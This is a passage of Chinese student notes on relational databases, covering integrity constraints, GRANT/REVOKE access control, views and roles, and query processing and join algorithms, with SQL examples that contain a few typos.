src="https://img-blog.csdnimg.cn/e4864b3c42ec4a80bda80abd90f6e55e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="参照完整性"><br><strong>对于参照表 <code>sc</code>  的行为：</strong></p><ul><li><strong>向 <code>sc</code>  表（参照表）中插入一个元组，这是会被拒绝的</strong>。因为有可能你所插入的元组的 <code>Sno</code> （外码）无法在 <code>Student</code>  表中找到，这就意味着在成绩表中插入了一个非本班同学的成绩，这显然是不合理的</li><li><strong>修改 <code>sc</code>  表（参照表）中的一个元组，这是会被拒绝的</strong>。因为有可能你会修改该元组的 <code>Sno</code> （外码），这就可能导致 <code>Sno</code>  无法在 <code>Student</code>  表中找到。</li><li><strong>删除 <code>sc</code>  表（参照表）中的一个元组，这是可行的</strong>。因为它无非就是一条成绩信息。<br><strong>对于被参照 <code>Student</code>  的行为：</strong></li><li><strong>删除 <code>Student</code>  表（被参照表）中的一个元组，这是会被拒绝（也有可能级联删除或设为 <code>NULL</code> ）的</strong>。因为删除一个元组后，该元组所对应的 <code>Sno</code> （主码）将不复存在，这就有可能导致 <code>sc</code>  表（参照表）中某些元组的 <code>Sno</code> （外码）在 <code>Student</code>  表中找不到。当然可以级联删除将 SC 表的相关内容一起删除。</li><li><strong>修改 <code>Student</code>  表（被参照表）中的一个元组，这是会被拒绝（也有可能级联删除或设为 <code>NULL</code> ）的</strong> 。因为一旦修改了该元组的 <code>Sno</code>  属性，就会发生和上面一样的问题。可以进行级联修改，这回导致 SC 表中的数据也被修改</li><li><strong>向 <code>Student</code>  表（被参照表）插入一个元组，这是可行的</strong>。因为它无非就是一个新同学嘛<br><strong> B，违约处理措施</strong><br>①拒绝：不允许操作，为默认策略<br>②级联：上述提到了。级联删除或修改会影响到其他与他相关的表的数据。<br>③设为空值：当删除或修改 <code>专业</code> 表（被参照表）的一个元组时造成了不一致，则<strong>将 <code>学生</code> 表（参照表）中的所有造成不一致的元组的对应属性（专业号）设为空值</strong></li><li>比如删除 <code>专业</code> 表中专业号为 12 的专业，那么接着就要把 <code>学生</code> 表中专业号 = 12 的所有元组的专业号设置为空值<br><strong> C：SQL 实现</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9)</span><br><span class="line">Sno CHAR(4) </span><br><span class="line">Grade SMALLINT,//是外码也是主码，故不能取空值，实体完整性</span><br><span class="line">PRIMARY KEY(Sno,Cno),</span><br><span class="line">FOREIGN KEY(Sno) REFERENCES Student(Sno)</span><br><span class="line">ON DELETE CASCADE //删除Student表的元组时，级联删除本表相应元组</span><br><span class="line">ON UPDATE CASCADE, //更新Student表中的Sno时，级联更新本表相应元组</span><br><span class="line">FOREIGN KEY(Cno) REFERENCES Course(Cno)</span><br><span class="line">ON DELETE NO ACTION //删除Course表的元组造成不一致时，拒绝执行</span><br><span class="line">ON UPDATE CASCADE //更新Course表中的Cno时，级联更新本表相应元组</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="三用户自定义完整性"><a class="markdownIt-Anchor" href="#三用户自定义完整性">#</a> 三，用户自定义完整性</h4><p>用户自定义完整性针对某一具体关系数据库的约束条件，反映<strong>某一具体应用所涉及的数据必须满足的语义要求</strong><br><strong>（1）属性上的约束条件</strong><br><strong> A: 不允许取空值 (NOT NULL)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9),</span><br><span class="line">Cno CHAR(4),</span><br><span class="line">Grade SMALLINT NOT NULL,</span><br><span class="line">PRIMARY KEY(Sno,Cno)//定义了实体完整性，隐含了不允许取空值，在列级中可不写</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>B：列值唯一（UNIQUE）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE DEPT</span><br><span class="line">(</span><br><span class="line">Deptno NUMERIC(2),</span><br><span class="line">Dname CHAR(9) UNIQUE NOT NULL, //唯一且不能取空值</span><br><span class="line">Location CHAR(10),</span><br><span class="line">PRIMARY KEY(Depto)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>C：满足指定条件（CHECK）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Student</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9) PRIMARY KEY,</span><br><span class="line">Sname CHAR(8) NOT NULL,</span><br><span class="line">Ssex CHAR(2) CHECK(Ssex IN (&#x27;男&#x27;,&#x27;女&#x27;)),</span><br><span class="line">Sage SMALLINT,</span><br><span class="line">Sdept CHAR(20)</span><br><span class="line">);</span><br><span class="line">-------------------------------------------</span><br><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9),</span><br><span class="line">Cno CHAR(4),</span><br><span class="line">Grade SMALLINT CHECK(Grade &gt;= 0 AND Grade &lt;= 100),</span><br><span class="line"></span><br><span class="line">PRIMARY KEY(Sno,Cno),</span><br><span class="line">FOREIGN KEY(Sno) REFERENCES Student(Sno),</span><br><span class="line">FOREIGN KEY(Cno) REFERENCES Course(Cno)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>（2）元组上的约束条件</strong><br>同属性值限制相比，元组级的限制可以设置<strong>不同属性之间</strong>的取值的相互约束条件<br>如，规定插入男性时，其名字不能以 <code>Ms.</code>  开头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Student</span><br><span class="line">(</span><br><span class="line">Sno Char(9),</span><br><span class="line">Sname CHAR(8) NOT NULL,</span><br><span class="line">Ssex CHAR(2),</span><br><span class="line">Sage SMALLINT,</span><br><span class="line">Sdept CHAR(20),</span><br><span class="line">PRIMARY KEY(Sno),</span><br><span class="line"></span><br><span class="line">CHECK(Ssex=&#x27;女&#x27; OR Sname NOT LIKE &#x27;Ms.%&#x27;)</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="约束命名子句断言和触发器"><a class="markdownIt-Anchor" href="#约束命名子句断言和触发器">#</a> 约束命名子句，断言和触发器</h3><p><s>这里老师的 PPT 似乎没有讲，先放一放，先找讲过的复习</s> ：）</p><h1 id="五数据库安全性"><a class="markdownIt-Anchor" href="#五数据库安全性">#</a> 五，数据库安全性</h1><p><s>这一章概念的东西好多，也不清除是不是需要记什么的</s><br>【定义】保护数据库以防止不合法使用所造成的数据泄露，更改或者破坏</p><h3 id="数据库安全性概述"><a class="markdownIt-Anchor" href="#数据库安全性概述">#</a> 数据库安全性概述</h3><h4 id="一数据库的不安全因素"><a class="markdownIt-Anchor" href="#一数据库的不安全因素">#</a> 一，数据库的不安全因素</h4><p><strong>1. 非授权用户对数据库的恶意存取和破坏:<strong> 一些</strong>黑客</strong>和<strong>犯罪分子</strong>在用户存取数据库时猎取用户名和用户口令，然后<strong>假冒</strong>合法用户偷取、修改甚至破坏用户数据。防范措施有:</p><ul><li><strong>用户身份鉴别</strong></li><li><strong>存取控制</strong></li><li><strong>视图</strong><br><strong> 2. 数据库中重要或敏感的数据被泄露:</strong> <strong>黑客和敌对分子</strong>千方百计盗窃数据库中的重要数据，一 - 些机密信息被暴露。防范措施有</li><li><strong>强制存取控制</strong></li><li><strong>数据加密存储</strong></li><li><strong>加密传输</strong><br><strong> 3. 安全环境的脆弱性</strong></li></ul><h4 id="二数据库安全性控制"><a class="markdownIt-Anchor" href="#二数据库安全性控制">#</a> 二：数据库安全性控制</h4><p><strong>数据库安全性控制的常用方法：</strong></p><ul><li><strong>用户标识</strong>和鉴定（Identification &amp; Authentication）: 系统提供的最外层安全保护措施</li><li>存取控制：<strong>访问权限（授权 和 约束）</strong></li><li>通过<strong>视图</strong>调整授权 ：定义可向用户授权数据库特定部分的用户视图</li><li><strong>审计</strong>：追踪信息，重现导致数据库现有状况的一系列事件</li><li><strong>密码存储</strong>：使用加密技术保护机密数据</li></ul><h5 id="1用户身份鉴别"><a class="markdownIt-Anchor" href="#1用户身份鉴别">#</a> 1，用户身份鉴别</h5><p><strong>每个用户在系统中都有一个用户标识。每个用户标识由用户名（user name）和用户标识号（UID）组成。系统内部记录着所有合法用户的标识，每次用户进入系统时，系统会核对用户的身份，只有通过鉴定后才提供相关数据库管理系统的权限</strong><br><strong>（1）静态口令鉴别</strong><br><strong>（2）动态口令鉴别</strong><br><strong>（3）生物特征鉴别</strong><br><strong>（4）智能卡鉴别</strong></p><h5 id="2存取控制"><a class="markdownIt-Anchor" href="#2存取控制">#</a> 2，存取控制</h5><p><strong>存取控制的目的就是确保只授权给有资格的用户访问数据库的权限，其余人等无法接近数据。主要包括以下两个部分</strong></p><ul><li><strong>定义用户权限</strong>：用户对某一数据对象的操作权力称为<strong>权限</strong>。某个用户应该具有何种权限是个<strong>管理问题和政策问题</strong>，而不是技术问题。数据库管理系统的功能是<strong>保证这些决定的执行</strong>。为此，数据库管理系统必须提供适当的语言来<strong>定义用户权限</strong>，这些定义经过编译后存储在数据字典中，被称做<strong>安全规则或授权规则</strong></li><li><strong>合法权限检查</strong>：每当用户发出存取数据库的操作请求后 (请求一般应包括操作类型、操作对象和操作用户等信息)，数据库管理系统查找<a href="#lable">数据字典</a>，<strong>根据安全规则进行合法权限检查</strong>，若用户的操作请求超出了定义的权限，系统将<strong>拒绝执行此操作</strong><br><strong>而存取控制方法又分为以下两类：</strong></li></ul><h6 id="1自主存取控制dac"><a class="markdownIt-Anchor" href="#1自主存取控制dac">#</a> （1）自主存取控制 DAC</h6><p><strong>A，基本概念</strong><br><strong>自主存取控制 DAC：SQL 中自主存取控制主要是通过 <code>GRANT</code>  语句和 <code>REVOKE</code>  语句来实现的。是指用户可以 “自主” 地决定将数据的存取权限授予何人、决定是否也将 “授权” 的权限授予别人。</strong><br><strong>授权：用户权限由数据库对象和操作类型这两个要素组成。定义一个用户的存取权限就是定义这个用户可以在哪些数据对象上进行哪些类型的操作。所谓授权就是指定义存取权限</strong></p><ul><li>在<strong>非关系系统</strong>中，用户只能对<strong>数据</strong>进行操作，存取控制的数据库对象也仅限于数据本身</li><li>在<strong>关系数据库系统</strong>中，存取控制的对象不仅有数据本身 (基本表中的数据、属性列上的数据），还有<strong>数据库模式 (包括数据库、基本表、视图和索引的创建等)</strong><br> 下表就是<strong>关系数据库中的主要存取权限：</strong><br><img src="https://img-blog.csdnimg.cn/202afc8ee1314578ac465140b086d3af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="主要存取权限"><br><strong> B：GRANT 与 REVOKE</strong><br>SQL 中使用 <code>GRANT</code>  和 <code>REVOKE</code>  语句向用户<strong>授予或收回</strong>对数据的操作权限<br>①：<strong>GRANT</strong><br><strong> 语法：格式如下，其含义为授予指定用户对指定操作对象的指定操作权限。注意</strong></li><li>如果指定了 <code>WITH GRANT OPTION</code>  子句，则<strong>获得某种权限的用户还可以把这种权限再授权给其他用户</strong>。但不允许<strong>循环授权</strong></li><li>如果未指定 <code>WITH GRANT OPTION</code>  子句，则<strong>获得某种权限的用户只能使用但无法传播</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant &lt;权限&gt;[,&lt;权限&gt;]…  </span><br><span class="line">[on &lt;对象类型&gt; &lt;对象名&gt;]  </span><br><span class="line">to &lt;用户&gt;[,&lt;用户&gt; …]  </span><br><span class="line">[with grant option];</span><br></pre></td></tr></table></figure><ul><li><strong>如果要授权所有权限，可以写 <code>ALL PRIVILEGES</code> </strong></li><li><strong>如果所有用户接受权限，可以写 <code>PUBLIC</code> </strong><br><strong> 以下对象可以发出 <code>GRANT</code> </strong></li><li>DBA</li><li>数据库对象的创建者</li><li>已经拥有该权限的用户<br>下面给出几个例子作为演示：<br>把<strong>查询</strong> Student 表的权限授权给用户 U1：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GRANT SELECT </span><br><span class="line">ON TABLE Student</span><br><span class="line">TO U1;</span><br></pre></td></tr></table></figure><p>把对表 SC 的查询权限授予所有用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GRANT SELECT</span><br><span class="line">ON TABLE SC</span><br><span class="line">TO PUBLIC;</span><br></pre></td></tr></table></figure><p>把对表 SC 的 INSERT 权限授予 U5 用户，并允许将此权限再授予其他用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GRANT INSERT</span><br><span class="line">ON TABLE SC</span><br><span class="line">TO U5</span><br><span class="line">WITH GRANT OPTION;  //表示其可以将授予它的权限授予其他人，但是在删除它权限时需要级联删除它授予的权限</span><br></pre></td></tr></table></figure><p><strong>②：REVOKE</strong></p><ul><li>如果加入 <code>CASCADE</code> ，表示<strong>收回某用户权限的同时也会把该用户所有授权过用户的权限一并收回</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">revoke &lt;权限&gt;[,&lt;权限&gt;]…  </span><br><span class="line">[on &lt;对象类型&gt; &lt;对象名&gt;]  </span><br><span class="line">from &lt;用户&gt;[,&lt;用户&gt; …]</span><br></pre></td></tr></table></figure><p><strong>③：创建数据库模式的权限</strong><br>前面所讲到都是对<strong>数据</strong>的操作权限，而对<strong>创建数据库模式类的数据库对象的授权则由数据库管理员在创建用户时实现</strong><br><strong>语法：使用 <code>CREATE USER</code>  语句创建用户，其格式如下。注意</strong></p><ul><li>只有系统的<strong>超级用户</strong>才有权创建一个新的数据库用户</li><li>新创建的数据库用户有三种权限： <code>CONNECT</code> 、 <code>RESCOURCE</code> 、 <code>DBA</code> <br><strong>C, 数据库角色</strong><br><strong>是被命名的一组与数据库操作相关的权限，也即角色是权限的集合。在创建用户时如果为其赋予某种角色，那么用户就自动拥有了该数据库角色所拥有的权限，从而省去了繁琐的授权语句</strong><br>综合演示：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//首先需要创建一个角色R1</span><br><span class="line">CREATE ROLE R1;</span><br><span class="line">//接着使用GRANT语句，使角色R1拥有对Student表的权限</span><br><span class="line">GRANT SELECT ,UPDATE,INSERT</span><br><span class="line">ON TABLE Student</span><br><span class="line">TO R1;</span><br><span class="line">//然后将这个角色授予用户U1、U2、U3，使他们具有角色R1所拥有的全部权限</span><br><span class="line">GRANT R1</span><br><span class="line">TO U1,U2,U3</span><br><span class="line">//最后，也可以通过R1来收回用户的权限</span><br><span class="line">REVOKE R1</span><br><span class="line">FROM U1;</span><br></pre></td></tr></table></figure><h6 id="2强制存取控制mac-ppt上扩展内容"><a class="markdownIt-Anchor" href="#2强制存取控制mac-ppt上扩展内容">#</a> （2）强制存取控制 MAC -ppt 上扩展内容</h6><p><s>先放一放，老师 PPT 似乎也没有讲到</s></p><h5 id="3视图"><a class="markdownIt-Anchor" href="#3视图">#</a> 3，视图</h5><p><strong>通过视图机制把要保密的数据对无权存取的用户隐藏起来，从而自动对数据提供一定程度的安全保护。</strong> 其主要的功能在于提供<strong>数据独立性</strong>。<br>在实际应用中通常是<strong>视图机制</strong>和<strong>授权机制</strong>进行配合使用。<br>这里给出一个例子：<br>在某大学中，假定王平老师只能检索计算机系学生的信息，系主任张明具有检索和增删改计算机系学生信息的所有权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIEW CS_Student</span><br><span class="line">AS</span><br><span class="line">SELECT *</span><br><span class="line">FROM Student</span><br><span class="line">WHERE Sdept=&#x27;CS&#x27;;</span><br><span class="line"></span><br><span class="line">GRANT SELECT</span><br><span class="line">ON CS_Student</span><br><span class="line">TO 王平;</span><br><span class="line"></span><br><span class="line">GRANT ALL PRIVILEGES</span><br><span class="line">ON CS_Student</span><br><span class="line">TO 张明;</span><br></pre></td></tr></table></figure><h5 id="4审计-ppt上扩展内容"><a class="markdownIt-Anchor" href="#4审计-ppt上扩展内容">#</a> 4，审计 -ppt 上扩展内容</h5><p><s>没讲</s></p><h5 id="5数据加密-ppt上扩展内容"><a class="markdownIt-Anchor" href="#5数据加密-ppt上扩展内容">#</a> 5，数据加密 -ppt 上扩展内容</h5><p><s>没讲</s></p><h4 id="三数据库产品安全性控制介绍-了解"><a class="markdownIt-Anchor" href="#三数据库产品安全性控制介绍-了解">#</a> 三，数据库产品安全性控制介绍 - 了解</h4><blockquote><p>这个是 PPT 上有，课本上没有的</p></blockquote><p><s>后面补充</s></p><h1 id="六查询处理与查询优化"><a class="markdownIt-Anchor" href="#六查询处理与查询优化">#</a> 六，查询处理与查询优化</h1><h2 id="查询处理"><a class="markdownIt-Anchor" href="#查询处理">#</a> 查询处理</h2><p>【定义】 查询处理是关系数据库管理系统执行查询语句的过程，其任务是吧用户提交给关系数据库管理系统的查询语句转化为更为高效的<strong>查询执行计划。</strong></p><h3 id="一查询处理步骤"><a class="markdownIt-Anchor" href="#一查询处理步骤">#</a> 一，查询处理步骤</h3><p>关系数据库管理系统查询处理可以分为 4 个阶段：</p><ul><li>查询分析</li><li>查询检查</li><li>查询优化</li><li>查询执行<br><img src="https://img-blog.csdnimg.cn/fb5e2957811b40b0bbdb537203e98efa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="查询处理步骤"><br><strong>（1）查询分析</strong><br>任务：<strong>对查询语句进行扫描，分析词法、语法是否符合 SQL 语法规则</strong></li><li>如果没有语法错误转入下一步</li><li>如果有语法错误则在报告中显示错误<br><strong>（2）查询检查</strong><br>任务：</li><li>对合法的查询语句进行<strong>语义检查</strong>，即根据数据字典中有关的模式定义检查语句中的数据库对象，如<strong>关系名、属性名是否存在和有效</strong></li><li>如果是对视图的操作，则要用<strong>视图消解方法</strong>把对视图的操作转换成对基本表的操作</li><li>还要对<strong>权限</strong>、<strong>完整性约束</strong>进行检查，如果违反则拒绝查询</li><li>检查通过后，<strong>把 SQL 查询语句转化为内部表示，也即等价的关系代数表达式</strong></li><li>在此过程中，<strong>要把数据库对象的外部名称换为内部表示</strong></li><li>RDBMS 一般用<strong>查询树</strong>（又称为<strong>语法分析树</strong>）来表示扩展的关系代数表达式<br><strong>（3）查询优化</strong><br>任务：<strong>每个查询都会有许多可供选择的执行策略和操作算法，查询优化就是选择一个高效执行的查询处理策略。按照优化的层次一般可以将查询优化分为</strong></li><li><strong>代数优化</strong>：是指<strong>关系代数表达式</strong>的优化，也即按照一定规则，通过对关系代数表达式进行<strong>等价变换</strong>，改变代数表达式中操作的<strong>次序和组合</strong>，使查询更高效</li><li><strong>物理优化</strong>：是指<strong>存取路径</strong>和<strong>底层操作算法</strong>的选择。选择依据可以是<strong>基于规则的 (rule based)</strong>、<strong>基于代价的 (cost based)、基于语义的 (semantic based)</strong><br><strong>（4）查询执行</strong><br>依据优化器得到的执行策略生成查询执行计划，由 <strong>代码生成器 (code generator)</strong> 生成执行这个查询计划的代码，然后加以执行，回送查询结果。</li></ul><h3 id="二实现查询操作的算法实例"><a class="markdownIt-Anchor" href="#二实现查询操作的算法实例">#</a> 二，实现查询操作的算法实例</h3><h4 id="1选择操作的实现"><a class="markdownIt-Anchor" href="#1选择操作的实现">#</a> （1）选择操作的实现</h4><p>以简单的单表为例，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT* FROM STUDENT WHERE&lt;条件表达式&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;条件表达式&gt;</code>  可以有以下几种情况:</p><ul><li>case1：无条件</li><li>case2: Sno = ‘20214132’</li><li>case3: Sage &gt; 20</li><li>case4 Sdept = ‘CS’ AND Sage &gt; 20<br> 选择操作只涉及一个关系，典型的实现方法有：</li></ul><h6 id="1全表扫描"><a class="markdownIt-Anchor" href="#1全表扫描">#</a> ①全表扫描</h6><p>思想：假设可以使用的内存块为 M 块</p><ul><li>按照物理次序读取 <code>Student</code>  的 M 块到内存</li><li>检查内存的每个元组 t，如果 t 满足选择条件，则输出 t</li><li>如果 <code>Student</code>  还有其他块未被处理，重复即可<br><strong>优缺点：</strong></li><li>优点：只需要很少的内存（最少为 1 块）就可以运行，且控制简单。适用于规模较小的表</li><li>缺点：对于规模大的表进行顺序扫描，当选择率低的时候会使效率很低</li></ul><h5 id="2索引扫描"><a class="markdownIt-Anchor" href="#2索引扫描">#</a> ②索引扫描</h5><p>思想：如果<strong>选择条件的属性上有索引（B + 树或者 hash 索引），可以用索引扫描。通过索引先找到满足条件的元组指针，再通过元组指针在查询的基本表中找到元组。</strong></p><ul><li>以 case2 为例：Sno = '20214132’并且 Sno 上有索引，则可以使用索引得到 Sno 为 \20214132 元组的指针，然后通过元组指针在 Student 表中检索到该学生</li><li>以 case3 为例：Sage&gt;20，并且 Sage 上有 B + 树索引，则可以使用 B + 树索引找到 Sage=20 的索引项，以此为入口点在 B + 树的顺序集上得到 Sage&gt;20 的所有元组指针，然后通过这些元组指针到 <code>Student</code>  表对中检索到所有年龄大于 20 的学生。</li><li>以 case4 为例：Sdept = ‘CS’ AND Sage &gt; 20，如果 <code>Sdept</code>  和 <code>Sage</code>  上都有索引，<strong>一种算法是</strong>：分别用上面的两种方法找到 AND 左右的两个句子，取两组指针的交际，再到 Student 表中检索，就得到计算机系年龄大于 20 的学生</li></ul><h4 id="2连接操作的实现-font-color-red重点题型font"><a class="markdownIt-Anchor" href="#2连接操作的实现-font-color-red重点题型font">#</a> （2）连接操作的实现 <font color = 'red'>重点题型</font></h4><p><strong>连接操作是查询处理中最常用也是最耗时的操作之一</strong> 。不失一般性，这里通过例子简单介绍 <strong>等值连接 (或自然连接)</strong> 最常用的几种算法思想</p><h5 id="1嵌套循环方法nested-loop"><a class="markdownIt-Anchor" href="#1嵌套循环方法nested-loop">#</a> ①：嵌套循环方法（nested loop）</h5><p><strong>思想：对外层循环 ( <code>Student</code>  表) 的每一个元组，检索内层循环 ( <code>SC</code>  表) 中的每一个元组，并检查这两个元组在连接属性 ( <code>Sno</code> ) 上是否相等。如果满足连接条件，则串接后作为结果输出，直到外层循环表中的元组处理完为止</strong></p><h5 id="2排序-合并方法sort-merge-join"><a class="markdownIt-Anchor" href="#2排序-合并方法sort-merge-join">#</a> ②：排序 - 合并方法（sort-merge join）</h5><ol><li>如果参与连接的表没有排好序，首先对 <code>Student</code>  表和 <code>SC</code>  表按连接属性 <code>Sno</code> <strong> 排序</strong></li><li>取 Student 表中第一个  <code>Sno</code> ,<strong> 依次扫描</strong> <code>SC</code>  表中具有相同 <code>Sno</code>  的元组，把它们连接起来</li><li>当扫描到 <code>Sno</code> <strong> 不相同的第 一个 SC 元组</strong>时，返回 <code>Student</code>  表扫描它的下一 个元组，再扫描 <code>SC</code>  表中具有相同 <code>Sno</code>  的元组，把它们连接起来<br><strong>重复上述步骤直至 <code>Student</code>  扫描完毕</strong></li></ol><h5 id="3索引连接index-join"><a class="markdownIt-Anchor" href="#3索引连接index-join">#</a> ③：索引连接（index join）</h5><p><strong>思想：</strong></p><ul><li>在 <code>SC</code>  表上已经建立了属性 <code>Sno</code>  的<strong>索引</strong></li><li>对 <code>Student</code>  中每一个元组，由 <code>Sno</code>  值通过 <code>SC</code>  的索引查找相应的 <code>SC</code>  元组</li><li>把这些 <code>SC</code>  元组和 <code>Student</code>  元组连接起来<br><strong>循环执行第二步和第三步，直至 <code>Student</code>  中的元组处理完毕</strong></li></ul><h5 id="4哈希连接hash-join"><a class="markdownIt-Anchor" href="#4哈希连接hash-join">#</a> ④：哈希连接（hash join）</h5><p><strong>思想：它把连接属性作为 hash 码，用同一个 hash 函数把 <code>Student</code>  表和 <code>SC</code>  表中的元组散列到 hash 表中</strong></p><ul><li><strong>划分阶段（创建阶段）</strong>：即创建 hash 表。对包含较少元组的表 ( 如 <code>Student</code>  表) 进行一遍处理，把它的元组按 hash 函数 (hash 码是连接属性) 分散到 hash 表的桶中</li><li><strong>试探阶段（连接阶段）</strong>：对另一个表 ( <code>SC</code>  表) 进行一遍处理，把 <code>SC</code>  表的元组也按同一个 hash 函数 (hash 码是连接属性) 进行散列，找到适当的 hash 桶，并把 <code>SC</code>  元组与桶中来自 <code>Student</code>  表并与之相匹配的元组连接起来。</li></ul><h2 id="查询优化"><a class="markdownIt-Anchor" href="#查询优化">#</a> 查询优化</h2><h3 id="一查询优化概述"><a class="markdownIt-Anchor" href="#一查询优化概述">#</a> 一，查询优化概述</h3><p><strong>（1）查询优化的地位和重要性</strong><br>关系系统的查询优化既是关系<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F&amp;spm=1001.2101.3001.7020">数据库管理系统</a>实现的<strong>关键技术</strong>，又是关系系统的<strong>优点所在</strong>。<br>在非关系系统中，<strong>用户必须了解存取路径，系统提供用户选择存取路径的手段，查询的效率由用户的存取策略决定，且系统是无法加以优化的。这就要求用户需要具有较高的数据库技术和程序设计水平</strong><br><strong>查询优化的优点不仅在于用户不必考虑如何最好地表达查询以获得较高的效率，而且在于系统可以比用户程序的 “优化” 做得更好</strong>。</p><ul><li>优化器可以从数据字典中获得很多统计信息，但是用户程序难以获得</li><li>即便数据库物理统计信息改变，系统也可以进行优化从而选择相应的执行计划，但是对于非关系系统则必须要重写程序</li><li>优化器可以考虑数百种不同的执行计划，但程序员一般仅能考虑有限的几种可能性</li><li>优化器包含了很多复杂的优化技术，这样就等同于所用的使用者间接拥有了这些技术<br><strong>（2）执行代价</strong><br>目前关系数据库管理系统通过某种代价模型计算出各种查询执行策略的执行代价，然后选取<strong>代价最小的执行方案</strong>。一般来说：<strong>总代价 = I/O 代价 + CPU 代价 + 内存代价 + 通信代价</strong></li><li>计算查询代价时一般用<strong>查询处理读写的块数</strong>作为衡量单位</li></ul><h3 id="二一个例子"><a class="markdownIt-Anchor" href="#二一个例子">#</a> 二，一个例子</h3><p>可以通过 “<strong>求选修了 2 号课程的学生姓名</strong>” 这样一个例子来说明为什么要进行查询优化<br>以下是一些<strong>系统假设</strong></p><ul><li>假定学生 - 课程数据库中有<strong> 1 000 个学生记录，10 000 个选课记录（平均每一个学生了选了 10 门课），其中选修 2 号课程的选课记录为 50 个</strong></li><li>有<strong> 7 个内存块</strong>（其中<strong>分配 5 块用于装入 <code>Student</code>  表，1 块用于装入 <code>SC</code>  表，1 块用于装入中间结果</strong>）</li><li>其中<strong>一块可以装入 10 个 <code>student</code>  元组</strong>（或 10 个 <code>student</code>  与 SC<a href="https://so.csdn.net/so/search?q=%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF&amp;spm=1001.2101.3001.7020"> 笛卡尔积</a>元组）；一块也可以 <strong>装入 50 个 SC 元组</strong>（因为 SC 的列数较少）</li><li>连接方法为：<strong>基于数据块的嵌套循环法。</strong></li><li><strong>之所以这样分配的原因</strong>：因为嵌套循环算法需要选用占用内存少的表作为外表，student 表有 1000 行，每块装 10 行，所以需要 100 